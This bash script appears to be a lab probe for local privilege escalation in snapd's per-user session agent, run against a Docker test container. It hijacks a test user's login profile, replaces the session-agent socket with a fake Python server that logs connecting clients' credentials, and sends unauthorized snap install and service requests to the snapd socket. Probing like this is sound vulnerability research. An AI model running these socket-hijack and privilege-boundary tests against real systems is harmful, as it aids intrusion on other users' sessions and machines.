#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/snapd-session-agent.out"

mkdir -p "$repo_dir/logs"

docker exec -i "$container" bash -s <<'TARGET' 2>&1 | tee "$log_path"
set +e

WORK=/tmp/snapd-session-agent-probe
ROOT_MARKER=/root/snapd_session_agent_lpe_root
USER_NAME=selfauth
USER_UID=1002
ATTACKER=attacker
ATTACKER_UID=1001
PROFILE=/home/selfauth/.bash_profile
PROFILE_BAK=$WORK/selfauth.bash_profile.bak
HOLD=/home/selfauth/snapd-session-agent-hold.sh
FAKE=/home/selfauth/snapd-session-agent-fake.py
USER_UNIT=/home/selfauth/.config/systemd/user/snap.snapd-session-agent-probe.service
USER_UNIT_BAK=$WORK/snap.snapd-session-agent-probe.service.bak
CREATED_SESSION_ID=
PROFILE_HAD=0
USER_UNIT_HAD=0

section() {
  printf '\n## %s\n' "$1"
}

run() {
  local label="$1"
  shift
  section "$label"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  "$@" 2>&1
  printf 'rc=%s\n' "$?"
}

run_json() {
  local label="$1"
  local body="$2"
  shift 2
  section "$label"
  printf 'stdin=%s\n' "$body"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  printf '%s' "$body" | "$@" 2>&1
  printf 'rc=%s\n' "${PIPESTATUS[1]}"
}

user_env() {
  env XDG_RUNTIME_DIR=/run/user/$USER_UID DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$USER_UID/bus "$@"
}

cleanup() {
  pkill -u "$USER_NAME" -f snapd-session-agent-fake.py >/dev/null 2>&1 || true
  if [ -S "/run/user/$USER_UID/bus" ]; then
    runuser -u "$USER_NAME" -- env XDG_RUNTIME_DIR=/run/user/$USER_UID DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$USER_UID/bus \
      systemctl --user start snapd.session-agent.socket >/dev/null 2>&1 || true
    rm -f "$USER_UNIT"
    if [ "$USER_UNIT_HAD" = 1 ]; then
      mkdir -p "$(dirname "$USER_UNIT")"
      cp -a "$USER_UNIT_BAK" "$USER_UNIT" 2>/dev/null || true
      chown "$USER_NAME:$USER_NAME" "$USER_UNIT" 2>/dev/null || true
    fi
    runuser -u "$USER_NAME" -- env XDG_RUNTIME_DIR=/run/user/$USER_UID DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$USER_UID/bus \
      systemctl --user daemon-reload >/dev/null 2>&1 || true
  fi
  rm -f "$HOLD" "$FAKE"
  if [ "$PROFILE_HAD" = 1 ]; then
    cp -a "$PROFILE_BAK" "$PROFILE" 2>/dev/null || true
    chown "$USER_NAME:$USER_NAME" "$PROFILE" 2>/dev/null || true
  else
    rm -f "$PROFILE"
  fi
  if [ -n "$CREATED_SESSION_ID" ]; then
    loginctl terminate-session "$CREATED_SESSION_ID" >/dev/null 2>&1 || true
  fi
  rm -rf "$WORK"
  rm -f "$ROOT_MARKER"
}

rm -rf "$WORK"
mkdir -p "$WORK"
chown "$USER_NAME:$USER_NAME" "$WORK" 2>/dev/null || true
trap cleanup EXIT
rm -f "$ROOT_MARKER"

section "target identity and packaged surface"
cat /etc/os-release | sed -n '1,8p'
id
id "$ATTACKER"
id "$USER_NAME"
dpkg-query -W -f='${binary:Package}\t${Version}\n' snapd systemd dbus polkitd 2>&1 | sort
snap version
printf '\n[packaged user units]\n'
sed -n '1,80p' /usr/lib/systemd/user/snapd.session-agent.socket
sed -n '1,80p' /usr/lib/systemd/user/snapd.session-agent.service
printf '\n[dbus activation]\n'
sed -n '1,80p' /usr/share/dbus-1/services/io.snapcraft.SessionAgent.service
printf '\n[default snapd socket state]\n'
systemctl is-active snapd.socket snapd.service snapd.seeded.service 2>&1 || true
stat -c '%A %a %U:%G %n' /run/snapd.socket /run/snapd-snap.socket /run/user /usr/bin/snap 2>&1 || true

section "inactive uid1001 attacker reachability"
ls -ld /run/user/$ATTACKER_UID 2>&1 || true
run "uid1001 session agent debug API without active runtime" \
  runuser -u "$ATTACKER" -- snap debug api --session-agent-uid=$ATTACKER_UID /v1/session-info
run "uid1001 XDG_RUNTIME_DIR spoof is ignored by client path" \
  runuser -u "$ATTACKER" -- env XDG_RUNTIME_DIR=/tmp/snapd-agent-fake-runtime snap debug api --session-agent-uid=$ATTACKER_UID /v1/session-info
run "uid1001 direct userd agent without /run/user/1001" \
  timeout 4 runuser -u "$ATTACKER" -- env XDG_RUNTIME_DIR=/tmp/snapd-agent-fake-runtime snap userd --agent

section "ensure active selfauth user session"
if [ -e "$PROFILE" ]; then
  PROFILE_HAD=1
  cp -a "$PROFILE" "$PROFILE_BAK"
fi
if [ -e "$USER_UNIT" ]; then
  USER_UNIT_HAD=1
  cp -a "$USER_UNIT" "$USER_UNIT_BAK"
fi

if [ ! -S "/run/user/$USER_UID/bus" ]; then
  cat >"$HOLD" <<'SH'
#!/usr/bin/env bash
set +e
echo "${XDG_SESSION_ID:-}" >/tmp/snapd-session-agent-probe/session-id
systemctl --user start snapd.session-agent.socket >/tmp/snapd-session-agent-probe/user-start.out 2>&1 || true
sleep 300
SH
  chmod 755 "$HOLD"
  chown "$USER_NAME:$USER_NAME" "$HOLD"
  cat >"$PROFILE" <<'SH'
exec /home/selfauth/snapd-session-agent-hold.sh
SH
  chown "$USER_NAME:$USER_NAME" "$PROFILE"
  openvt -c 12 -f -- /bin/login -f "$USER_NAME" >"$WORK/openvt.out" 2>&1 &
  for _ in $(seq 1 80); do
    [ -S "/run/user/$USER_UID/bus" ] && [ -s "$WORK/session-id" ] && break
    sleep 0.25
  done
  CREATED_SESSION_ID="$(cat "$WORK/session-id" 2>/dev/null)"
fi

run "active selfauth logind status" loginctl user-status "$USER_NAME"
run "active selfauth runtime tree" find /run/user/$USER_UID -maxdepth 2 -printf '%M %u:%g %p -> %l\n'
run "active selfauth session-agent user unit status" \
  runuser -u "$USER_NAME" -- env XDG_RUNTIME_DIR=/run/user/$USER_UID DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$USER_UID/bus \
  systemctl --user status --no-pager snapd.session-agent.socket snapd.session-agent.service
run "selfauth can query own real session agent" \
  runuser -u "$USER_NAME" -- env XDG_RUNTIME_DIR=/run/user/$USER_UID DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$USER_UID/bus \
  snap debug api --session-agent-uid=$USER_UID /v1/session-info
run "root can query real selfauth session agent" \
  snap debug api --session-agent-uid=$USER_UID /v1/session-info
run "uid1001 cannot cross into selfauth runtime dir" \
  runuser -u "$ATTACKER" -- snap debug api --session-agent-uid=$USER_UID /v1/session-info

section "session-agent service-control remains uid1002 user scope"
runuser -u "$USER_NAME" -- mkdir -p /home/selfauth/.config/systemd/user
cat >"$USER_UNIT" <<'UNIT'
[Service]
Type=oneshot
ExecStart=/bin/sh -c 'id > /tmp/snapd-session-agent-probe/user-service-id'
UNIT
chown "$USER_NAME:$USER_NAME" "$USER_UNIT"
run_json "root client asks session agent to daemon-reload user manager" \
  '{"action":"daemon-reload"}' \
  snap debug api --session-agent-uid=$USER_UID -X POST -H 'Content-Type: application/json' /v1/service-control
run_json "root client asks session agent to start snap-prefixed user service" \
  '{"action":"start","services":["snap.snapd-session-agent-probe.service"]}' \
  snap debug api --session-agent-uid=$USER_UID -X POST -H 'Content-Type: application/json' /v1/service-control
run "user service execution identity" cat "$WORK/user-service-id"
run_json "session agent rejects non-snap service names" \
  '{"action":"start","services":["ssh.service"]}' \
  snap debug api --session-agent-uid=$USER_UID -X POST -H 'Content-Type: application/json' /v1/service-control

section "active user socket replacement and root client trust boundary"
run "stop real selfauth session-agent socket" \
  runuser -u "$USER_NAME" -- env XDG_RUNTIME_DIR=/run/user/$USER_UID DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$USER_UID/bus \
  systemctl --user stop snapd.session-agent.service snapd.session-agent.socket
cat >"$FAKE" <<'PY'
#!/usr/bin/env python3
import json
import os
import socket
import struct

sock = "/run/user/1002/snapd-session-agent.socket"
log = "/tmp/snapd-session-agent-probe/fake-agent.log"
try:
    os.unlink(sock)
except FileNotFoundError:
    pass
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.bind(sock)
os.chmod(sock, 0o666)
s.listen(20)
open("/tmp/snapd-session-agent-probe/fake-ready", "w").write("ready\n")
while True:
    c, _ = s.accept()
    creds = c.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, 12)
    pid, uid, gid = struct.unpack("3i", creds)
    data = c.recv(65535)
    with open(log, "a") as f:
        f.write("CONNECT pid=%d uid=%d gid=%d\n%s\n---\n" % (pid, uid, gid, data.decode("latin1", "replace")))
    body = json.dumps({
        "type": "sync",
        "status-code": 200,
        "status": "OK",
        "result": {"version": "fake-user-agent"}
    }).encode()
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
    c.close()
PY
chmod 755 "$FAKE"
chown "$USER_NAME:$USER_NAME" "$FAKE"
runuser -u "$USER_NAME" -- "$FAKE" >"$WORK/fake-stdout" 2>&1 &
for _ in $(seq 1 40); do
  [ -e "$WORK/fake-ready" ] && break
  sleep 0.1
done
run "fake selfauth agent process" pgrep -a -u "$USER_NAME" -f snapd-session-agent-fake.py
run "root debug client connects to replaced selfauth socket" \
  snap debug api --session-agent-uid=$USER_UID /v1/session-info
run "selfauth debug client connects to replaced selfauth socket" \
  runuser -u "$USER_NAME" -- snap debug api --session-agent-uid=$USER_UID /v1/session-info
run "uid1001 still cannot connect to selfauth runtime socket" \
  runuser -u "$ATTACKER" -- snap debug api --session-agent-uid=$USER_UID /v1/session-info

before_lines="$(wc -l <"$WORK/fake-agent.log" 2>/dev/null || echo 0)"
run "uid1001 unauthorized snap install REST with interaction hint" \
  runuser -u "$ATTACKER" -- curl --max-time 8 --silent --show-error --unix-socket /run/snapd.socket -i \
  -H 'Content-Type: application/json' -H 'X-Allow-Interaction: true' \
  -X POST --data '{"action":"install","snaps":["hello-world"]}' http://localhost/v2/snaps
run "active selfauth unauthorized snap install REST with interaction hint" \
  runuser -u "$USER_NAME" -- curl --max-time 8 --silent --show-error --unix-socket /run/snapd.socket -i \
  -H 'Content-Type: application/json' -H 'X-Allow-Interaction: true' \
  -X POST --data '{"action":"install","snaps":["hello-world"]}' http://localhost/v2/snaps
run "active selfauth unauthorized user-service REST with interaction hint" \
  runuser -u "$USER_NAME" -- curl --max-time 8 --silent --show-error --unix-socket /run/snapd.socket -i \
  -H 'Content-Type: application/json' -H 'X-Allow-Interaction: true' \
  -X POST --data '{"action":"start","names":["nosnap.svc"],"scope":["user"],"users":["selfauth"]}' http://localhost/v2/apps
run "active selfauth read-only apps query" \
  runuser -u "$USER_NAME" -- curl --max-time 8 --silent --show-error --unix-socket /run/snapd.socket -i \
  'http://localhost/v2/apps?select=service'
after_lines="$(wc -l <"$WORK/fake-agent.log" 2>/dev/null || echo 0)"
printf 'fake_agent_log_lines_before_snapd_rest=%s after_snapd_rest=%s\n' "$before_lines" "$after_lines"
run "fake agent connection log" sed -n '1,240p' "$WORK/fake-agent.log"

section "root proof check and cleanup state"
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_PROOF=YES"
  stat -c '%A %U:%G %s %n' "$ROOT_MARKER"
  sed -n '1,40p' "$ROOT_MARKER"
else
  echo "ROOT_PROOF=NO"
fi
stat -c '%A %a %U:%G %n' /run/user/$USER_UID /run/user/$USER_UID/snapd-session-agent.socket 2>&1 || true
echo "cleanup will restore/terminate only probe-created session and files"
TARGET
